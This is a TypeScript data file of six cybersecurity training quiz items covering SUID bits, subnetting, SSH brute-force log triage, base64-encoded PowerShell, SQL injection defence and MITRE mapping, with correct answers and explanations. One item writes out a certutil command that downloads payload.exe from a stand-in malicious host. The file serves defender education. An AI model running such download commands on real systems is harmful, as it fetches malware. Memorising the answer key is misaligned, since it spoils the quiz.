export interface MicroChallenge {
  id: string;
  title: string;
  category: 'LINUX' | 'NETWORKING' | 'WEB' | 'SOC_LOGS' | 'ENCODING' | 'MITRE';
  difficulty: 'EASY' | 'MEDIUM' | 'HARD';
  estimatedSeconds: number;
  prompt: string;
  codeSnippet?: string;
  options: string[];
  correctIndex: number;
  explanation: string;
  xpReward: number;
  skillId: string;
  mitreRef?: string;
}

export const MICRO_CHALLENGES_DATA: MicroChallenge[] = [
  {
    id: 'mc-01',
    title: 'Linux SUID Permission Bit',
    category: 'LINUX',
    difficulty: 'EASY',
    estimatedSeconds: 60,
    prompt: 'You execute `ls -l /usr/bin/custom-tool` and observe `-rwsr-xr-x 1 root root`. What does the lowercase "s" in the owner permissions indicate?',
    options: [
      'The file is encrypted with AES-256',
      'The binary executes with the privileges of the file owner (root) when run by any user (SUID)',
      'The file is a symbolic link pointing to /root/custom-tool',
      'The binary is quarantined by the system antivirus'
    ],
    correctIndex: 1,
    explanation: 'The lowercase "s" in the owner execute position denotes SUID (Set User ID). When executed, the process assumes the owner UID (root), which requires strict auditing to prevent privilege escalation.',
    xpReward: 30,
    skillId: 'linux-permissions',
    mitreRef: 'T1548.001'
  },
  {
    id: 'mc-02',
    title: 'CIDR Subnet Capacity',
    category: 'NETWORKING',
    difficulty: 'EASY',
    estimatedSeconds: 60,
    prompt: 'How many usable host IP addresses are available in a `/28` IPv4 subnet?',
    options: [
      '14 usable hosts (16 total addresses - 2 for network and broadcast)',
      '16 usable hosts',
      '30 usable hosts',
      '28 usable hosts'
    ],
    correctIndex: 0,
    explanation: 'A /28 subnet has 32 - 28 = 4 host bits. 2^4 = 16 total IP addresses. Subtracting 1 network address and 1 broadcast address leaves 14 usable host IPs.',
    xpReward: 30,
    skillId: 'networking-subnetting'
  },
  {
    id: 'mc-03',
    title: 'Authentication Log Triage',
    category: 'SOC_LOGS',
    difficulty: 'MEDIUM',
    estimatedSeconds: 90,
    prompt: 'Analyze this auth.log entry from an exposed SSH server. What attack pattern does this indicate?',
    codeSnippet: `Oct 24 14:22:01 edge-gateway sshd[4912]: Failed password for invalid user admin from 198.51.100.44 port 41292 ssh2
Oct 24 14:22:02 edge-gateway sshd[4914]: Failed password for invalid user test from 198.51.100.44 port 41294 ssh2
Oct 24 14:22:03 edge-gateway sshd[4918]: Failed password for invalid user deploy from 198.51.100.44 port 41296 ssh2
Oct 24 14:22:04 edge-gateway sshd[4922]: Accepted password for root from 198.51.100.44 port 41298 ssh2`,
    options: [
      'Normal automated health-check probe',
      'SSH credential brute-force/dictionary attack culminating in successful unauthorized root access',
      'DDoS SYN flood exhaustion attack',
      'DNS cache poisoning response'
    ],
    correctIndex: 1,
    explanation: 'Rapid successive failed logins with changing usernames from a single source IP followed by an accepted password indicates a dictionary/brute-force attack (MITRE T1110) that succeeded on user root.',
    xpReward: 45,
    skillId: 'soc-log-analysis',
    mitreRef: 'T1110.001'
  },
  {
    id: 'mc-04',
    title: 'Base64 Obfuscation Decoding',
    category: 'ENCODING',
    difficulty: 'EASY',
    estimatedSeconds: 60,
    prompt: 'During malware analysis, an encoded PowerShell command contains `powershell -EncodedCommand d2hvYW1p`. What plaintext command does `d2hvYW1p` decode to?',
    options: [
      'whoami',
      'net user',
      'ipconfig',
      'calc.exe'
    ],
    correctIndex: 0,
    explanation: 'Base64 decoding "d2hvYW1p" produces "whoami", a standard discovery command used by threat actors to identify their active user context.',
    xpReward: 30,
    skillId: 'encoding-analysis',
    mitreRef: 'T1033'
  },
  {
    id: 'mc-05',
    title: 'SQL Injection Remediation',
    category: 'WEB',
    difficulty: 'MEDIUM',
    estimatedSeconds: 90,
    prompt: 'Which code pattern represents the industry-standard defense against SQL Injection in web services?',
    options: [
      'String concatenation with URL decoding',
      'Parameterized Queries / Prepared Statements with strong type binding',
      'Storing database passwords in base64 format',
      'Changing MySQL default port 3306 to 3307'
    ],
    correctIndex: 1,
    explanation: 'Parameterized queries ensure the database driver treats user input strictly as data parameters rather than executable SQL code, neutralizing SQL injection regardless of malicious input.',
    xpReward: 40,
    skillId: 'web-sqli',
    mitreRef: 'T1190'
  },
  {
    id: 'mc-06',
    title: 'MITRE ATT&CK Mapping: Living-off-the-Land',
    category: 'MITRE',
    difficulty: 'HARD',
    estimatedSeconds: 120,
    prompt: 'An attacker uses built-in administrative tools like `certutil.exe -urlcache -split -f http://malicious.site/payload.exe` to download malware. Which MITRE ATT&CK technique does this represent?',
    options: [
      'T1046: Network Service Scanning',
      'T1105: Ingress Tool Transfer (Living off the Land)',
      'T1078: Valid Accounts',
      'T1059.001: PowerShell'
    ],
    correctIndex: 1,
    explanation: 'Using native trusted OS binaries like certutil or bitsadmin to fetch remote payloads is classified under MITRE ATT&CK Technique T1105 (Ingress Tool Transfer / LOLBAS).',
    xpReward: 50,
    skillId: 'mitre-analysis',
    mitreRef: 'T1105'
  }
];

export class MicroChallengeService {
  static getAllChallenges(): MicroChallenge[] {
    return MICRO_CHALLENGES_DATA;
  }

  static getChallengesByCategory(category: string): MicroChallenge[] {
    if (category === 'ALL') return MICRO_CHALLENGES_DATA;
    return MICRO_CHALLENGES_DATA.filter(c => c.category === category);
  }

  static getChallengeById(id: string): MicroChallenge | undefined {
    return MICRO_CHALLENGES_DATA.find(c => c.id === id);
  }
}
